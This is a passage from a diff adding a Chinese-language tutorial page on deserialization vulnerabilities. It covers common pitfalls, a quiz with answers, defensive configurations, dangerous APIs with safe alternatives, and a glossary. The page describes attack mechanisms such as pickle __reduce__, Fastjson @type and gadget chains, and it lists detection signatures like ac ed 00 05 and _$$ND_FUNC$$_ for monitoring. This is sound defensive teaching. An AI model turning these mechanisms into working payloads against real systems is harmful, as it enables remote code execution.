+    <div class="crow"><code>mvn dependency:tree | grep commons-collections</code><span class="desc">排查 classpath 上的 gadget 库（CC、Groovy、C3P0、Rome 等）</span><button class="copy">复制</button></div>
+    <div class="crow"><code>java -Djdk.serialFilter=... -jar app.jar</code><span class="desc">全局启用序列化过滤兜底（按白名单配置）</span><button class="copy">复制</button></div>
+  </div>
+  <div class="callout ok">
+    <b>RASP 在这类漏洞上的独特价值：</b>反序列化发生在应用进程内，网络层 WAF 看不到对象图，而 RASP 直接 Hook <span class="k">ObjectInputStream.resolveClass</span>——反序列化真正实例化每个类的瞬间。此时做类白名单校验、异常类告警、阻断，<b>能把"字节流特征识别"升级为"行为识别"</b>，是绕过编码变形的有效兜底。没条件上 RASP 的团队，至少要在反序列化入口加自定义 Filter + 告警日志。
+  </div>
+</section>
+
+<section id="s8">
+  <div class="shead"><span class="mins">模块 8</span><h2>十个常见坑</h2></div>
+  <div class="pit"><div class="num">1</div><div class="pb"><div class="pt">以为"我们用 JSON 所以安全"</div><div class="pd">JSON.parse 安全，但 Fastjson 的 <span class="k">@type</span>、node-serialize 的函数标记、某些库的"多态反序列化"开关，都让 JSON 数据携带类型信息。<b>安全的是纯数据 JSON，不是"叫 JSON 的库"。</b></div></div></div>
+  <div class="pit"><div class="num">2</div><div class="pb"><div class="pt">签名校验了，但没防重放和过期</div><div class="pd">HMAC 验签通过后，攻击者把旧载荷原样重放依然成立。<b>签名载荷要带时间戳/随机数</b>，并校验时效窗口。</div></div></div>
+  <div class="pit"><div class="num">3</div><div class="pb"><div class="pt">升级了 JDK 就认为万事大吉</div><div class="pd">JEP 290 是缓解不是根治：类名变形绕过、filter 默认配置非白名单、依赖里的 gadget 依旧存在。<b>JDK 升级 + 应用层白名单 + 依赖治理，三件事都要做。</b></div></div></div>
+  <div class="pit"><div class="num">4</div><div class="pb"><div class="pt">用黑名单过滤危险类</div><div class="pd">类数量浩如烟海，黑名单永远滞后；且攻击者会找没被收录的 gadget。<b>白名单才是正解</b>——只允许业务 DTO，其余全部拒绝。</div></div></div>
+  <div class="pit"><div class="num">5</div><div class="pb"><div class="pt">不限制序列化数据的大小和对象图深度</div><div class="pd">深层嵌套的对象图、超大数组能让反序列化过程内存飙升/CPU 打满，成为 DoS 入口。<b>入口要限制字节长度、图深度和元素数量。</b></div></div></div>
+  <div class="pit"><div class="num">6</div><div class="pb"><div class="pt">Redis/RabbitMQ 里的"内部数据"被间接注入</div><div class="pd">缓存键或队列消息可被其他入口（SSRF、未授权 Redis）写入恶意序列化数据，业务取出后 loads 即中招。<b>中间件也要鉴权和网络隔离，别当可信通道。</b></div></div></div>
+  <div class="pit"><div class="num">7</div><div class="pb"><div class="pt">内网 RPC 用原生序列化且无认证</div><div class="pd">"内网流量不可信"是零信任的基本假设——任何一个服务被打穿，原生序列化 RPC 就是横向移动的高速公路。<b>内网调用同样要认证 + 纯数据协议。</b></div></div></div>
+  <div class="pit"><div class="num">8</div><div class="pb"><div class="pt">Python 用 pickle 做缓存/队列且键可控</div><div class="pd">Celery 任务体、Redis 缓存对象、Django session 用 pickle，一旦有任何写入入口被控就是 RCE。<b>能换 JSON 就换，不能换就签名后再 loads。</b></div></div></div>
+  <div class="pit"><div class="num">9</div><div class="pb"><div class="pt">日志里躺着魔数却没人认识</div><div class="pd">请求日志里大量 <span class="k">ac ed 00 05</span> 或 <span class="k">rO0AB</span>（Base64）没人警觉——这是扫描/利用的前兆。<b>把这些特征加成监控规则，出现即告警。</b></div></div></div>
+  <div class="pit"><div class="num">10</div><div class="pb"><div class="pt">以为 WAF 规则能挡住序列化攻击</div><div class="pd">Base64、URL 编码、分段传输、对象图变形都能绕开特征匹配。<b>WAF 是告警层不是防护层</b>，真正的防护在白名单和协议替换。</div></div></div>
+</section>
+
+<section id="s9">
+  <div class="shead"><span class="mins">自测</span><h2>六道题</h2></div>
+  <div class="quiz">
+    <div class="q" data-a="2">
+      <div class="qt">1. Java 原生序列化字节流的起始魔数是？</div>
+      <button class="opt">CA FE BA BE</button>
+      <button class="opt">50 4B 03 04</button>
+      <button class="opt">AC ED 00 05</button>
+      <div class="ans">正确答案：<b>AC ED 00 05</b>。Java 序列化流的固定头。Base64 编码后常以 <span class="k">rO0AB</span> 开头——在日志/流量里看到它，说明有人在尝试 Java 反序列化攻击，应立即告警排查。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">2. Java 反序列化漏洞的根本机制是？</div>
+      <button class="opt">序列化数据没有加密，可以被中间人读取</button>
+      <button class="opt">反序列化框架会自动调用对象上的 readObject 等回调，攻击者可构造对象图触发 gadget 链</button>
+      <button class="opt">Java 的类加载器会加载任意字节码</button>
+      <div class="ans">正确答案：<b>readObject 等回调自动触发</b>。反序列化不是"读数据"而是"重建对象"，重建时框架反射调用 readObject；攻击者把类库里的 gadget（如 Commons Collections 的 Transformer 链）串成对象图，还原过程就替他执行了任意方法。<b>注意漏洞往往在依赖库里，不在业务代码里。</b></div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">3. Python 中 pickle.loads() 处理不可信数据为什么危险？</div>
+      <button class="opt">__reduce__ 返回的可调用对象会在反序列化时被自动执行，可以是 os.system 等任意函数</button>
+      <button class="opt">pickle 不压缩数据，会被撑爆内存</button>
+      <button class="opt">pickle 是明文格式，会泄露敏感字段</button>
+      <div class="ans">正确答案：<b>__reduce__ 自动调用</b>。对象定义 <span class="k">__reduce__</span> 返回 (callable, args)，反序列化时框架原样执行——callable 可以是 os.system。典型危险场景：Celery 任务体、Redis 缓存、Django session。防护：换 JSON，或 HMAC 验签后再 loads。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">4. Fastjson 历史漏洞的核心原因是？</div>
+      <button class="opt">JSON 解析速度太快，没做输入校验</button>
+      <button class="opt">Fastjson 用 C 语言实现，存在内存越界</button>
+      <button class="opt">autoType 允许 JSON 里的 @type 字段指定反序列化目标类，把类型决定权交给外部</button>
+      <div class="ans">正确答案：<b>@type 指定目标类</b>。Fastjson 按 <span class="k">@type</span> 实例化对应类并调用其 setter，攻击者选一个"有危险 setter"的类（如触发 JNDI 的 JdbcRowSetImpl）即 RCE。修复：升级 1.2.83+/fastjson2、关闭或白名单化 autoType。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">5. 关于 node-serialize，正确的说法是？</div>
+      <button class="opt">它只支持 JSON 数据类型，因此和 JSON.parse 一样安全</button>
+      <button class="opt">它用 _$$ND_FUNC$$_ 标记支持函数序列化，unserialize 时会 eval 其中内容</button>
+      <button class="opt">它的漏洞只在服务端渲染时触发，API 场景无风险</button>
+      <div class="ans">正确答案：<b>IIFE 标记即 eval</b>。node-serialize 为支持函数序列化引入 <span class="k">_$$ND_FUNC$$_</span> 标记，反序列化时把标记内内容当代码执行——数据里出现该标记就等价于一次 eval。触发场景（Cookie、session、缓存）里数据往往来自客户端。<b>该库已不维护，应替换为 JSON。</b></div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">6. 反序列化防御的第一优先级措施是？</div>
+      <button class="opt">不用原生序列化，跨边界数据改用 JSON/protobuf 等纯数据格式</button>
+      <button class="opt">给序列化数据加密，让攻击者看不懂</button>
+      <button class="opt">在 WAF 上加序列化攻击特征规则</button>
+      <div class="ans">正确答案：<b>换纯数据协议</b>。加密只防"看"不防"改+触发"；WAF 特征可被编码变形绕过且是告警层。真正根治的是消灭"输入指定类型/代码"的可能——L1 协议层。在此之上再做类白名单（L2）和 JEP 290/RASP 兜底（L3）。</div>
+    </div>
+  </div>
+</section>
+
+<section id="s10">
+  <div class="shead"><span class="mins">附录</span><h2>速查卡与术语表</h2></div>
+  <h3>按语言查防护</h3>
+  <div class="cmds">
+    <div class="crow"><code>SafeObjectInputStream extends ObjectInputStream + resolveClass 白名单</code><span class="desc">Java 应用层类白名单，最可靠的自持方案</span><button class="copy">复制</button></div>
+    <div class="crow"><code>-Djdk.serialFilter=maxdepth=100;...</code><span class="desc">JEP 290 全局过滤（JDK 9+ / 8u121+），按白名单配置</span><button class="copy">复制</button></div>
+    <div class="crow"><code>new ValidatingObjectInputStream(in).accept(DTO.class)</code><span class="desc">Apache Commons IO 的现成白名单实现</span><button class="copy">复制</button></div>
+    <div class="crow"><code>ParserConfig.setAutoTypeSupport(false)</code><span class="desc">Fastjson 关闭 autoType；必须用则配白名单</span><button class="copy">复制</button></div>
+    <div class="crow"><code>json.loads() 替代 pickle.loads()</code><span class="desc">Python 跨边界一律 JSON；必须 pickle 则先 HMAC 验签</span><button class="copy">复制</button></div>
+    <div class="crow"><code>unserialize($d, ['allowed_classes' =&gt; false])</code><span class="desc">PHP 一行关闭类重建，只还原数组/标量</span><button class="copy">复制</button></div>
+    <div class="crow"><code>yaml.safe_load 替代 yaml.load</code><span class="desc">PyYAML 同类陷阱：load 可构造任意对象</span><button class="copy">复制</button></div>
+    <div class="crow"><code>JSON.parse 替代 node-serialize.unserialize</code><span class="desc">Node 移除 _$$ND_FUNC$$_ eval 面</span><button class="copy">复制</button></div>
+    <div class="crow"><code>mvn dependency:tree | grep -E "commons-collections|groovy|c3p0|rome"</code><span class="desc">排查 classpath gadget 库</span><button class="copy">复制</button></div>
+    <div class="crow"><code>监控特征：ac ed 00 05 / rO0AB / _$$ND_FUNC$$_ / O:数字:"</code><span class="desc">流量与日志中的利用前兆，命中即告警</span><button class="copy">复制</button></div>
+  </div>
+
+  <h3>各语言危险 API 与安全替代</h3>
+  <table>
+    <tr><th style="width:110px">语言</th><th style="width:220px">危险 API</th><th>安全替代</th></tr>
+    <tr><td><b>Java</b></td><td class="f">ObjectInputStream.readObject</td><td>JSON/Jackson/Gson（无 @type 多态）、protobuf、白名单 Filter</td></tr>
+    <tr><td><b>Java JSON</b></td><td class="f">fastjson parseObject + @type</td><td>fastjson2 / 关闭 autoType / 类型白名单</td></tr>
+    <tr><td><b>Python</b></td><td class="f">pickle.loads / marshal.loads / yaml.load</td><td>json.loads / yaml.safe_load</td></tr>
+    <tr><td><b>PHP</b></td><td class="f">unserialize()</td><td>json_decode；必须用时 allowed_classes=false + 验签</td></tr>
+    <tr><td><b>Node</b></td><td class="f">node-serialize.unserialize</td><td>JSON.parse；杜绝 eval 处理外部字符串</td></tr>
+    <tr><td><b>Ruby</b></td><td class="f">Marshal.load</td><td>JSON.parse / Oj 严格模式</td></tr>
+    <tr><td><b>.NET</b></td><td class="f">BinaryFormatter.Deserialize</td><td>System.Text.Json / XmlSerializer（禁用 BinaryFormatter，官方已弃用）</td></tr>
+  </table>
+
+  <h3>术语表</h3>
+  <table>
+    <tr><th style="width:190px">术语</th><th>一句话解释</th></tr>
+    <tr><td><b>序列化/反序列化</b></td><td>对象转字节流/字节流转对象；后者会自动执行对象上的方法，是风险所在</td></tr>
+    <tr><td><b>gadget</b></td><td>类库中本身合法、但可被恶意组合的方法片段</td></tr>
+    <tr><td><b>gadget chain</b></td><td>多个 gadget 串成的调用链，反序列化时自动执行到危险操作</td></tr>
+    <tr><td><b>POP 链</b></td><td>PHP 的 Property Oriented Programming，借对象属性串联魔术方法利用</td></tr>
+    <tr><td><b>魔术方法</b></td><td>PHP 的 __wakeup/__destruct/__toString 等自动回调方法</td></tr>
+    <tr><td><b>__reduce__</b></td><td>Python pickle 的还原协议，返回的可调用对象会被自动执行</td></tr>
+    <tr><td><b>readObject</b></td><td>Java 反序列化时框架反射自动调用的私有回调</td></tr>
+    <tr><td><b>ysoserial</b></td><td>Java 反序列化利用工具，内置多条现成 gadget chain</td></tr>
+    <tr><td><b>JEP 290</b></td><td>JDK 内置序列化过滤机制（9+ 原生，8u121 等回溯），按类名做校验</td></tr>
+    <tr><td><b>jdk.serialFilter</b></td><td>JEP 290 的系统属性配置入口，全局指定过滤规则</td></tr>
+    <tr><td><b>resolveClass</b></td><td>ObjectInputStream 解析类名的钩子，白名单校验的挂点</td></tr>
+    <tr><td><b>autoType</b></td><td>Fastjson 的 @type 特性，允许 JSON 指定反序列化目标类</td></tr>
+    <tr><td><b>IIFE</b></td><td>立即执行函数；node-serialize 用 _$$ND_FUNC$$_ 标记触发，等价 eval</td></tr>
+    <tr><td><b>魔数</b></td><td>文件/流的起始标识字节，如 Java 序列化 ac ed 00 05</td></tr>
+    <tr><td><b>RASP</b></td><td>运行时应用自我保护，进程内 Hook 敏感调用做检测与阻断</td></tr>
+    <tr><td><b>零信任</b></td><td>不信任任何内网流量，每个调用独立认证与校验</td></tr>
+    <tr><td><b>多态反序列化</b></td><td>反序列化时按数据里的类型信息实例化具体子类的能力，风险总源头</td></tr>
+    <tr><td><b>SBOM</b></td><td>软件物料清单，用于在 gadget 库爆出漏洞时快速定位影响面</td></tr>
+    <tr><td><b>安全边界</b></td><td>不可信数据进入可信系统的入口，是防护措施的部署位置</td></tr>
+    <tr><td><b>HMAC 验签</b></td><td>带密钥的消息摘要，验证数据完整性并防重放（配合时间戳）</td></tr>
+  </table>
+
+  <div class="callout ok">
+    <b>下一步怎么练：</b>① 用 <span class="k">grep -rn "pickle.loads\|unserialize(\|readObject(\|node-serialize" src/</span> 把自己项目的反序列化入口全找出来，逐个回答"入可从哪来、有没有白名单、有没有验签"；② 检查 classpath 有没有 commons-collections 3.x、旧版 fastjson；③ 在测试环境抓一个自己系统的序列化数据，看看日志里能不能找到 <span class="k">ac ed 00 05</span>；④ 给 Java 服务加上 SafeObjectInputStream + jdk.serialFilter，用一串伪造字节验证拒绝生效；⑤ 把四个监控特征（ac ed / rO0AB / _$$ND_FUNC$$_ / O:数字:）写进 SIEM 规则。<br><br>
+    <b>之后值得单独学：</b>ysoserial 的 chain 原理逐个研读（理解 gadget 组合思想比记工具重要）、JEP 290 filter 语法细节、RASP 的部署与绕过面、以及 WebLogic/Shiro 等中间件反序列化的历史利用链（它们是内网横向的高频入口）。
+  </div>
+</section>
+
+</main>
+
+<footer>二十分钟学透反序列化漏洞 · 记住：JSON.parse 安全，eval 不安全；带类型的原生反序列化要当代码执行面来防</footer>
+
+<script>
+var total=1200,left=total,timer=null,running=false;
+var clock=document.getElementById('clock'),startBtn=document.getElementById('start'),hint=document.getElementById('hint');
+function fmt(s){var m=Math.floor(s/60),x=s%60;return (m<10?'0':'')+m+':'+(x<10?'0':'')+x;}
+function tick(){
+  left--;clock.textContent=fmt(Math.max(left,0));
+  if(left<=180&&left>0){clock.classList.add('done');}
+  if(left<=0){
+    clearInterval(timer);running=false;clock.textContent='00:00';clock.classList.add('done');
+    startBtn.textContent='再来一轮';
+    hint.textContent='时间到。模块 2（Java）和模块 7（三层防御）值得再读一遍。';
+  }
+}
+startBtn.onclick=function(){
+  if(running){clearInterval(timer);running=false;startBtn.textContent='继续';return;}
+  if(left<=0){left=total;clock.classList.remove('done');clock.textContent=fmt(left);}
+  running=true;startBtn.textContent='暂停';
+  hint.textContent='计时中 —— 顺便想想你系统里有哪些"字节流变对象"的入口。';
+  timer=setInterval(tick,1000);
+};
+document.getElementById('reset').onclick=function(){
+  clearInterval(timer);running=false;left=total;
+  clock.textContent=fmt(total);clock.classList.remove('done');
+  startBtn.textContent='开始计时';
+  hint.textContent='建议先想清楚自己系统里有哪些"字节流变对象"的入口：RPC、缓存、Cookie、消息队列。';
+};
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  document.getElementById('bar').style.width=(h>0?(window.scrollY/h*100):0)+'%';
+});
+document.querySelectorAll('.copy').forEach(function(b){
+  b.onclick=function(){
+    var t=b.parentNode.querySelector('code').textContent;
+    var done=function(){b.textContent='已复制';b.classList.add('ok');setTimeout(function(){b.textContent='复制';b.classList.remove('ok');},1200);};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,function(){fb(t);done();});}
+    else{fb(t);done();}
+  };
+});
+function fb(t){
+  var ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+document.querySelectorAll('.q').forEach(function(q){
+  var idx=parseInt(q.dataset.a,10),opts=q.querySelectorAll('.opt');
+  opts.forEach(function(o,i){
+    o.onclick=function(){
+      if(q.dataset.done)return;
+      q.dataset.done='1';
+      opts.forEach(function(x,j){x.classList.add(j===idx?'right':'wrong');});
+      q.querySelector('.ans').classList.add('show');
+    };
+  });
+});
+</script>
+</body>
+</html>
